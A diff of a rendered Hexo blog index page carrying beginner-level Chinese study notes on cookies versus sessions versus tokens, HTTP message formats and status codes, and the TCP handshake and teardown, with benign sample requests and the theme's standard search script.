+<p>1、存储位置不同： ookie数据存放在客户的浏览器上，session数据放在服务器上<br>2、隐私策略不同：cookie不是很安全， 别人可以分析存放在本地的cookie并进行cookie欺骗，考虑到安全应当使用session<br>3、session会在一定时间内保存在服务器上。当访问增多，就会比较占用你服务器的性能，考虑到减轻服务器性能方面，应当使用cookie<br>4、存储大小不同： 单个cookie保存的数据不能超过4k, 很多浏览器都限制一个站点最多保存20个cookie<br>一般建议： 将登陆信息等重要信息存放为session, 其他信息如果需要保留，可以放在cookie中</p>
+</blockquote>
+<p><strong>Token和Session的区别</strong><br>Session是一种HTTP储存机制， 为无状态的HTTP提供持久机制;<br>Token就是令牌， 比如你授权(登录)一个程序时，它就是个依据，判断你是否已经授权该软件；<br>Session和Token并不矛盾，作为身份认证Token安全性比Session好，因为每一个请求都有签名还能防止监听以及重放攻击，而Session就必须依赖链路层来保障通讯安全了。如上所说，如果你需要实现有状态的回话，仍然可以增加Session来在服务端保存一些状态。</p>
+<p><strong>总结</strong><br>cookie，session，Token没有绝对的好与坏之分，只要还是要结合实际的业务场景和需求来决定采用哪种方式来管理回话，当然也可以三种都用。<br><img src="/./img/3.jpg"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/http.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/http.html" itemprop="url">http</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-05-24T12:58:27+08:00">
+                2023-05-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>分层思想</strong><br>每一个环节都是独立的，但是如果上层的环节没有完成就无法进行下一层的工作，在互联网中通信是需要标准的，而这所谓的标准就是协议，双方规定好的，举个例子：双方都使用英语来交流。这些协议很多，规定了每一个环节，但整个流程比较复杂，所以需要分层，变成功能相对单一的子过程</p>
+<ul>
+<li>这样可以使整个流程更加清晰，发杂问题简单化</li>
+<li>更容易发现问题并针对性解决问题</li>
+</ul>
+<h2 id="网络分层模型"><a href="#网络分层模型" class="headerlink" title="网络分层模型"></a>网络分层模型</h2><p><strong>OSI七层模型</strong><br><img src="/./img/190.png"><br>同层使用相同协议，每层都填满了协议，下层为上层提供服务，其中两个重要的协议：TCP协议（传输层）、IP（网络层），后来表示层、会话层、应用层统称应用层，新的架构为了纪念这两个重要的协议，命名为TCP&#x2F;IP五层协议栈</p>
+<h2 id="数据的封装和解封装"><a href="#数据的封装和解封装" class="headerlink" title="数据的封装和解封装"></a>数据的封装和解封装</h2><p>比如说qq软件（应用层）输入hello，传到传输层，然后 </p>
+<h2 id="了解HTTP"><a href="#了解HTTP" class="headerlink" title="了解HTTP"></a>了解HTTP</h2><p>HTTP（Hypertext Transfer Protocol），超文本传输协议，指的是在计算机世界中专门在两点之间传输超文本数据的规范。</p>
+<p>超文本指的是现在计算机可以传输文字、图片、音频、视频，甚至点击文字或图片能够进行超链接的跳转，文本的语义被扩大化，因此被称为超文本。</p>
+<p>传输指的是由传输载体负责把二进制数据包由计算机终端传输到另一个终端的过程。通常我们把传输数据包的一方称为请求方，把接到二进制数据包的一方称为应答方。请求方和应答方可以进行互换，请求方也可以作为应答方接受数据，应答方也可以作为请求方请求数据。</p>
+<p>网络协议指的是网络中（包括互联网）传递、管理信息的一些规范。ftp、http、ftmp、pop、tcp&#x2F;ip这些都是网络协议。</p>
+<p><strong>网络模型</strong><br>为了给网络协议设计结构，设计者以分层的方式设计组织网络协议，每个协议属于层次模型之一，且每一层都向其上一层提供服务。每个分层中所有协议被称为协议栈，因特网协议栈分为五个部分：物理层、链路层、网络层、运输层和应用层。</p>
+<p><strong>应用层</strong><br>应用层是网络应用程序和网络协议存放的分层。应用层协议分布在多个端系统上一个端系统应用程序与另外一个端系统应用程序交换信息分组，我们把位于应用层的信息分组称为报文(message)。常用的HTTP协议、FTP协议等等都在这一层中。</p>
+<p><strong>常见的应用层协议</strong></p>
+<blockquote>
+<p>1、DNS（域名系统）<br>DNS 是互联网使用的命名系统，用来把人们使用的机器名字（域名）转换为 IP 地址<br>2、FTP（文件传输协议）<br>FTP 是使用得最广泛的文件传送协议<br>3、Telnet（远程终端协议）<br>Telnet 是一个简单的远程终端协议，结合端口使用，常用于服务探测<br>4. HTTP（超文本传送协议）<br>HTTP 是面向事务的应用层协议，它是互联网能够可靠地交换文件的重要基础。http 使用面向连接的 TCP 作为运输层协议，保证了数据的可靠性。<br>5、SMTP（电子邮件协议）<br>SMTP 是简单邮件传送协议。SMTP规定了在两个相互通信的 SMTP 进程之间应如何交换信息。SMTP通信包括三个阶段，分别是：建立连接、邮件传送、连接释放。<br>6、POP3（邮件读取协议）<br>POP3，全称是 Post Office Protocol 3，该协议通常被用来接收电子邮件<br>7. SNMP（简单网络管理协议）<br>SNMP 协议由三部分组成，包括：SNMP本身、管理信息结构 SMI 和管理信息 MIB。SNMP 定义了管理站和代理之间所交换的分组格式。SMI 定义了命名对象类型的通用规则，以及把对象和对象的值进行编码。MIB 在被管理的实体中创建了命名对象，并规定类型。<br>8、TFTP（简单文件传送协议）<br>TFTP是TCP&#x2F;IP协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，它基于UDP协议而实现的，提供不复杂、开销不大的文件传输服务。默认端口号是 69。</p>
+</blockquote>
+<p>除了上面介绍的协议外，其他应用层协议还有 DHCP、Gopher 、IMAP4、IRC、 NNTP、 XMPP、 SIP、 SSH、 RPC、 RTCP、 RTP、RTSP、SDP、 SOAP、 GTP、 STUN、 NTP、SSDP、 BGP 等</p>
+<h2 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h2><p>当你在Web浏览器中输入一个URL时，浏览器将根据你的要求创建并发送请求，该请求包含所输入的URL以及一些与浏览器本身相关的信息。当服务器收到这个请求时将返回一个响应，该响应包括与该请求相关的信息以及位于指定URL（如果有的话）的数据。直到浏览器解析该响应并显示出网页（或其他资源）为止。</p>
+<p><strong>HTTP请求</strong><br>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;request-line&gt;</span><br><span class="line">&lt;headers&gt;</span><br><span class="line">&lt;blank line&gt;</span><br><span class="line">[&lt;request-body&gt;]</span><br></pre></td></tr></table></figure>
+<p>格式说明：</p>
+<ul>
+<li>第一行必须是一个请求行(request-line),用来说明请求方法,要访问的资源(URL<br>的一部分)以及所使用的HTTP版本</li>
+<li>请求头部信息,用来说明服务器要使用的附加信息，key：value</li>
+<li>空行(一定要有)</li>
+<li>请求主体信息</li>
+</ul>
+<p><strong>Get：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-cn</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)</span><br><span class="line">Host: www.google.cn</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">&lt;空行&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>说明:</strong></p>
+<ul>
+<li>第一部分说明了该请求是一个GET请求.该行的第二部分是一个斜杠(&#x2F;),用来说明请求的是该域名的根目录.该行的最后一部分说明使用的是HTTP1.1版本(另一个可选荐是1.0)</li>
+<li>请求头部信息：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- HOST将指出请求的目的地.</span><br><span class="line">- User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送.</span><br><span class="line">- Connection,通常将浏览器操作设置为Keep-Alive</span><br></pre></td></tr></table></figure></li>
+<li>第三部分,空行,即使不存在请求主体,这个空行也是必需的</li>
+</ul>
+<p><strong>Post</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP1.1</span><br><span class="line">Host:www.wrox.com</span><br><span class="line">User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:40</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">name=Professional%20Ajax&amp;publisher=Wiley</span><br></pre></td></tr></table></figure>
+<p><strong>说明:</strong></p>
+<ul>
+<li>请求行开始处的GET改为POST,以表示不同的请求方式</li>
+<li>Content-Type说明了请求主体的内容是如何编码的.浏览器始终以application&#x2F;x-www-form-urlencoded的格式编码来传送数据,这是针对简单URL编码的MIME类型</li>
+<li>Content-Length说明了请求主体的字节数</li>
+<li>最后请求主体.名称-值对的形式</li>
+</ul>
+<h2 id="HTTP响应"><a href="#HTTP响应" class="headerlink" title="HTTP响应"></a>HTTP响应</h2><p><strong>格式：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;status-line&gt;</span><br><span class="line">&lt;headers&gt;</span><br><span class="line">&lt;blank line&gt;</span><br><span class="line">[&lt;response-body&gt;]</span><br></pre></td></tr></table></figure>
+<p><strong>说明：</strong></p>
+<ul>
+<li>状态行：协议版本 状态码 状态文字</li>
+<li>消息报头 key：value</li>
+<li>空行(一定要有)</li>
+<li>响应主体信息</li>
+</ul>
+<p><strong>案例：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 31 Dec 2005 23:59:59 GMT</span><br><span class="line">Content-Type: text/html;charset=ISO-8859-1</span><br><span class="line">Content-Length: 122</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Wrox Homepage&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;!-- body goes here --&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>在响应中唯一真正的区别在于第一行中用状态信息代替了请求信息。状态行（status line）通过提供一个状态码来说明所请求的资源情况。最常用的状态码有：<br>200 OK      &#x2F;&#x2F;客户端请求成功<br>400 Bad Request  &#x2F;&#x2F;客户端请求有语法错误，不能被服务器所理解<br>401 Unauthorized &#x2F;&#x2F;请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用<br>403 Forbidden  &#x2F;&#x2F;服务器收到请求，但是拒绝提供服务<br>404 Not Found  &#x2F;&#x2F;请求资源不存在，eg：输入了错误的URL<br>500 Internal Server Error &#x2F;&#x2F;服务器发生不可预期的错误<br>503 Server Unavailable  &#x2F;&#x2F;服务器当前不能处理客户端的请求，一段时间后可能恢复正常</p>
+<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><strong>http:\host[:port][abs_path][?query]#fragment</strong><br>协议：告诉浏览器使用何种协议，常用的是http协议或https协议<br>主机（host）：域名或ip，指示需要向网络上哪一台发起请求<br>端口（port）：表示用于访问WEB服务器上资源的入口，如果访问的该 Web 服务器使用HTTP协议的标准端口（HTTP为80，HTTPS为443）授予对其资源的访问权限，则通常省略此部分。<br>路径（abs_path）：web服务器上资源的路径，以端口后第一个&#x2F;开始，到?结束<br>查询参数（query）：提供给web服务器的额外参数，如果为GET请求一般URL带有查询参数<br>锚点（fragment）：给予浏览器显示位于该点的内容的指示，其片段标识符不会与请求一起发送到服务器</p>
+<h2 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h2><ul>
+<li>Host：表示对象所在主机，指明了服务器的域名，以及（可选的）服务器监听的TCP端口号。如果没有给定端口号，会自动使用被请求服务的默认端口</li>
+<li>Connection： 决定当前事务（一次三次握手和四次挥手）完成后，是否会关闭网络连接。若为持久性连接（keep-alive）则事务完成后不关闭网络连接，反之为非持久性连接（close），一次事务完成后关闭网络连接。</li>
+<li>User-agent: 请求头用来告诉 Web 服务器，浏览器使用的类型</li>
+<li>Date：表示请求时的格林威治时间</li>
+<li>Content-Length：实体报头指示实体主体的大小，以字节为单位，发送到接收方。</li>
+<li>HTTP Referer 属性是请求标头的一部分，当浏览器向 web 服务器发送请求的时候，一般会Referer：告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</li>
+<li>Upgrade-Insecure-Requests：用来向服务器端发送信号，表示客户端优先选择加密及带有身份验证的响应。</li>
+<li>Accept：接受请求 HTTP 标头会通告客户端其能够理解的 MIME 类型。<br>文本文件： text&#x2F;html、text&#x2F;plain、text&#x2F;css、application&#x2F;xhtml+xml、application&#x2F;xml<br>图片文件： image&#x2F;jpeg、image&#x2F;gif、image&#x2F;png<br>视频文件： video&#x2F;mpeg、video&#x2F;quicktime<br>应用程序二进制文件： application&#x2F;octet-stream、application&#x2F;zip</li>
+</ul>
+<h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p>2xx：成功响应</p>
+<ul>
+<li>200 成功响应</li>
+<li>204 请求处理成功，但是没有资源可以返回</li>
+<li>206 对资源某一部分进行响应，由Content-Range 指定范围的实体内容。</li>
+</ul>
+<p>3xx：需要进行附加操作以完成请求</p>
+<ul>
+<li>301 永久性重定向，该状态码表示请求的资源已经重新分配 URI，以后应该使用资源现有的 URI</li>
+<li>302 临时性重定向。该状态码表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问。</li>
+<li>303 该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源。</li>
+<li>304 该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。</li>
+<li>307 临时重定向。该状态码与 302 Found 有着相同的含义。</li>
+</ul>
+<p>4xx：客户端发生错误</p>
+<ul>
+<li>400 该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。</li>
+<li>401 该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。</li>
+<li>403 该状态码表明对请求资源的访问被服务器拒绝了。</li>
+<li>404 该状态码表明服务器上无法找到请求的资源。</li>
+</ul>
+<p>5xx：服务器本身发生错误</p>
+<ul>
+<li>500 该状态码表明服务器端在执行请求时发生了错误。</li>
+<li>503 该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</li>
+</ul>
+<h2 id="常用其他协议介绍"><a href="#常用其他协议介绍" class="headerlink" title="常用其他协议介绍"></a>常用其他协议介绍</h2><p><strong>DNS</strong><br>计算机网络中的每个端系统都有一个IP地址存在，而把IP地址转换为便于人类记忆的协议就是 DNS 协议。DNS 的全称是域名系统，它作为将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。</p>
+<p><strong>HTTPS</strong><br>HTTP 一般是明文传输，很容易被攻击者窃取重要信息，鉴于此，HTTPS 应运而生。HTTPS和HTTP有很大的不同在于HTTPS是以安全为目标的HTTP通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性。HTTPS在HTTP的基础上增加了SSL层，也就是说<code>HTTPS = HTTP + SSL</code>。</p>
+<p><strong>TCP&#x2F;IP</strong><br>互联网进行通信时，需要相应的网络协议，TCP&#x2F;IP 原本就是为使用互联网而开发制定的协议族。因此，互联网的协议就是 TCP&#x2F;IP，TCP&#x2F;IP 就是互联网的协议</p>
+<h2 id="网络模型"><a href="#网络模型" class="headerlink" title="网络模型"></a>网络模型</h2><p>为了给网络协议设计结构，设计者以分层的方式设计组织网络协议，每个协议属于层次模型之一，且每一层都向其上一层提供服务。每个分层中所有协议被称为协议栈，因特网协议栈分为五个部分：物理层、链路层、网络层、运输层和应用层。</p>
+<h3 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a>运输层</h3><p>运输层在应用程序断点之间传送应用程序报文。这一层中主要用到的是TCP协议与UDP协议，我们把运输层的分组称为报文段(segment)。</p>
+<ul>
+<li>TCP是面向连接的、可靠的流协议。流就是指不间断的数据结构，当应用程序采用TCP发送消息时，虽然可以保证发送的顺序，但还是犹如没有任何间隔的数据流发送给接收端。</li>
+<li>UDP是不具有可靠性的数据报协议。细微的处理它会交给上层的应用去完成。在UDP的情况下，虽然可以确保发送消息的大小，却不能保证消息一定会到达。</li>
+</ul>
+<h2 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h2><p>而要建立TCP&#x2F;IP连接，就需要三次握手进行初始化</p>
+<blockquote>
+<p>第一次握手：客户端发送一个TCP标志位SYN&#x3D;1，ACK&#x3D;0的数据包给服务端，并随机会产生一个Seq&#x3D;J.当服务端接收到这个数据后，服务端由SYN&#x3D;1可知客户端是想要建立连接；<br>第二次握手：服务端要对客户端的联机请求进行确认，向客户端发送应答号ACK&#x3D;1、SYN&#x3D;1、确认号Ack&#x3D;J+1，此值是客户端的序列号加1，还会产生一个随机的序列号Seq&#x3D;K，这样就告诉客户端可以进行连接；<br>第三次握手：客户端收到数据后检查Ack是否为J+1，以及标志位ACK的值是否为1，若为1，则会发送ACK&#x3D;1、确认号码Ack&#x3D;K+1，告诉服务端,你的请求连接被确认，连接可以建立，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。</p>
+</blockquote>
+<p>为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误<br>三次握手是在安全可靠的基础上，握手次数最少的方案。两次握手并不能保证可靠性，四次握手又浪费了效率。当然，有的需要更高安全性的地方，是可以有N次握手协议的，但那是特殊情况。</p>
+<h2 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h2><p>四次挥手即终止TCP连接，就是指断开一个TCP连接时，需要客户端和服务端总共发送4个包以确认连接的断开。在socket编程中，这一过程由客户端或服务端任一方执行close来触发。</p>
+<blockquote>
+<p>第一次挥手：客户端发送一个FIN&#x3D;M，用来关闭客户端到服务器端的数据传送，客户端进入FIN_WAIT_1状态。意思是说”我客户端没有数据要发给你了”，但是如果你服务器端还有数据没有发送完成，则不必急着关闭连接，可以继续发送数据。<br>第二次挥手：服务器端收到FIN后，先发送ack&#x3D;M+1，告诉客户端，你的请求我收到了，但是我还没准备好，请继续你等我的消息。这个时候客户端就进入FIN_WAIT_2 状态，继续等待服务器端的FIN报文。<br>第三次挥手：当服务器端确定数据已发送完成，则向客户端发送FIN&#x3D;N报文，告诉客户端，好了，我这边数据发完了，准备好关闭连接了。服务器端进入LAST_ACK状态。<br>第四次挥手：客户端收到FIN&#x3D;N报文后，就知道可以关闭连接了，但是他还是不相信网络，怕服务器端不知道要关闭，所以发送ack&#x3D;N+1后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。服务器端收到ACK后，就知道可以断开连接了。客户端等待了2MSL后依然没有收到回复，则证明服务器端已正常关闭，这时客户端也关闭连接。最终完成了四次握手。</p>
+</blockquote>
+<h2 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h2><p>普通的TCP通信无法保证数据的安全，它随时可能被第三方截获而泄漏通信双方之间的隐私，这显然是我们不希望看到的，尤其在跟用户名、密码、个人信息息息相关的通信过程（如网上银行交易、机密文件传输等等）尤其看重数据交互的隐秘性，所以我们常常用SSL协议来建立安全保密的通信，SSL协议能够保证交互双方的数据按密文方式传输，第三方在没有私钥的情况下几乎无法破解，从而到达保密的目的<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/volcan1987/article/details/8996220">SSL交互(握手)过程详解</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
-  {% include '_partials/pagination.swig' %}
-{% endblock %}
+  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
+  </nav>
 
-{% block sidebar %}
-  {{ sidebar_template.render(false) }}
-{% endblock %}
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yzklov</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
